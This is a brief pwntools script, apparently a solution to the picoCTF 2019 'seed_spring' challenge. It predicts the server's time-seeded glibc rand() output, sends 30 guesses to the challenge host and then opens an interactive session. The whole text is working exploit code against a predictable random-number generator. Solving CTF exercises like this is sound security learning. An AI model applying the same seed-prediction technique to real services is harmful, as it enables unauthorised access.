from pwn import *
import ctypes

glibc = ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc-2.27.so')

#sock = process("./seed_spring")
sock = remote("2019shell1.picoctf.com", 47241)
glibc.srand(glibc.time(0))
for i in range(30):
    print(i)
    sock.sendlineafter("height: ", str(glibc.rand() & 0xf))
    print(sock.recvline())

sock.interactive()
